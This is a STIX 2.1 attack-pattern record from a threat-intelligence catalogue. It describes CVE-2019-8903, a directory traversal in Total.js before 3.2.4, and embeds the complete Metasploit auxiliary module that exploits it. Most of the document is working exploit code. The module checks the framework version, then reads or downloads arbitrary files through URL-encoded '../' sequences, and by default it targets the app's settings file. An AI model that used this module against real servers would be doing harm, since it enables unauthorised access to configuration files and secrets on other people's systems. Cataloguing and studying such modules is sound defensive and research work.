{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cf70c1d5-4f18-4b04-82c0-8b467d5854a9",
    "created": "2024-08-14T16:30:20.219158Z",
    "modified": "2024-08-14T16:30:20.219162Z",
    "name": "Total.js prior to 3.2.4 Directory Traversal",
    "description": "( This module check and exploits a directory traversal vulnerability in Total.js prior to 3.2.4.  Here is a list of accepted extensions: flac, jpg, jpeg, png, gif, ico, js, css, txt, xml woff, woff2, otf, ttf, eot, svg, zip, rar, pdf, docx, xlsx, doc, xls, html, htm, appcache manifest, map, ogv, ogg, mp4, mp3, webp, webm, swf, package, json, md, m4v, jsx, heif, heic )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/totaljs_traversal.rb",
            "external_id": "totaljs_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-8903"
        },
        {
            "source_name": "reference",
            "url": "https://blog.totaljs.com/blogs/news/20190213-a-critical-security-fix/"
        },
        {
            "source_name": "reference",
            "url": "https://security.snyk.io/vuln/SNYK-JS-TOTALJS-173710"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# Check and exploit Total.js Directory Traversal (CVE-2019-8903)\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Total.js prior to 3.2.4 Directory Traversal',\n      'Description' => %q(\n        This module check and exploits a directory traversal vulnerability in Total.js prior to 3.2.4.\n\n        Here is a list of accepted extensions: flac, jpg, jpeg, png, gif, ico, js, css, txt, xml,\n        woff, woff2, otf, ttf, eot, svg, zip, rar, pdf, docx, xlsx, doc, xls, html, htm, appcache,\n        manifest, map, ogv, ogg, mp4, mp3, webp, webm, swf, package, json, md, m4v, jsx, heif, heic\n      ),\n      'Author' =>\n        [\n          'Riccardo Krauter', # Discovery\n          'Fabio Cogno'       # Metasploit module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2019-8903'],\n          ['CWE', '22'],\n          ['URL', 'https://blog.totaljs.com/blogs/news/20190213-a-critical-security-fix/'],\n          ['URL', 'https://security.snyk.io/vuln/SNYK-JS-TOTALJS-173710']\n        ],\n      'Privileged' => false,\n      'DisclosureDate' => '2019-02-18',\n      'Actions' =>\n        [\n          ['CHECK', { 'Description' => 'Check if the target is vulnerable' }],\n          ['READ', { 'Description' => 'Attempt to print file content' }],\n          ['DOWNLOAD', { 'Description' => 'Attempt to download a file' }]\n        ],\n      'DefaultAction' => 'CHECK'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'Path to Total.js App installation', '/']),\n        OptInt.new('DEPTH', [true, 'Traversal depth', 1]),\n        OptString.new('FILE', [true, 'File to obtain', 'databases/settings.json'])\n      ]\n    )\n  end\n\n  def check_ext\n    extensions = %w[\n      flac jpg jpeg png gif ico js css txt xml\n      woff woff2 otf ttf eot svg zip rar pdf\n      docx xlsx doc xls html htm appcache\n      manifest map ogv ogg mp4 mp3 webp webm\n      swf package json md m4v jsx heif heic\n    ]\n\n    ext = datastore['FILE'].split('.').last\n\n    unless extensions.include? ext\n      print_warning \"Extension #{ext} is not supported by the HTTP static route of the framework\"\n    end\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path) + '%2e%2e%2fpackage.json'\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => uri\n    )\n    if res && res.code == 200\n      json = res.get_json_document\n      if json.empty? || !json['dependencies']['total.js']\n        return Exploit::CheckCode::Safe\n      else\n        print_status(\"Total.js version is: #{json['dependencies']['total.js']}\")\n        print_status(\"App name: #{json['name']}\")\n        print_status(\"App description: #{json['description']}\")\n        print_status(\"App version: #{json['version']}\")\n        return Exploit::CheckCode::Vulnerable\n      end\n    elsif res && res.headers['X-Powered-By'].to_s.downcase.include?('total.js')\n      print_status('Target appear to be vulnerable!')\n      print_status(\"X-Powered-By: #{res.headers['X-Powered-By']}\")\n      return Exploit::CheckCode::Detected\n    else\n      vprint_warning('No response')\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def read\n    check_ext\n    traverse = '%2e%2e%2f' * datastore['DEPTH']\n    uri = normalize_uri(target_uri.path) + traverse + datastore['FILE']\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => uri\n    )\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n    if res.code != 200\n      print_error(\"Unable to read '#{datastore['FILE']}', possibly because:\")\n      print_error(\"\\t1. File does not exist.\")\n      print_error(\"\\t2. No permission.\")\n      return\n    end\n    print_status(\"Getting #{datastore['FILE']}...\")\n    print_line(res.body)\n  end\n\n  def download\n    check_ext\n    traverse = '%2e%2e%2f' * datastore['DEPTH']\n    uri = normalize_uri(target_uri.path) + traverse + datastore['FILE']\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => uri\n    )\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n    if res.code != 200\n      print_error(\"Unable to read '#{datastore['FILE']}', possibly because:\")\n      print_error(\"\\t1. File does not exist.\")\n      print_error(\"\\t2. No permission.\")\n      return\n    end\n    fname = datastore['FILE'].split('/')[-1].chop\n    ctype = res.headers['Content-Type'].split(';')\n    loot = store_loot('lfi.data', ctype[0], rhost, res.body, fname)\n    print_good(\"File #{fname} downloaded to: #{loot}\")\n  end\n\n  def run\n    case action.name\n    when 'CHECK'\n      check\n    when 'READ'\n      read\n    when 'DOWNLOAD'\n      download\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-02-18"
}